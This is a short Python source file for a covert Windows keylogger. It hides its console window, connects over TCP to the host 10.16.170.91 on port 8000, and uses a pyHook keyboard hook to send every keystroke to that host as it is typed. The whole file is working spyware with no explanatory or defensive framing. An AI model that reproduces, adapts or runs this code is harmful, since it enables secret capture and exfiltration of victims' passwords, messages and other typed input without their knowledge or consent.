import pyHook, pythoncom,os,socket,win32api,win32console, win32gui

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM )
s.connect(('10.16.170.91',8000))
s.send("logger".encode())

def OnKeyboardEvent(event):
    if (event.Ascii) == 8:
        data = 'Backspace'
    elif (event.Ascii) == 13:
        data = 'Enter'
    elif (event.Ascii) == 0:
        data = 'Uncaptured Key'
    else:
        data = str(chr(event.Ascii))
    s.send(data.encode())
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()



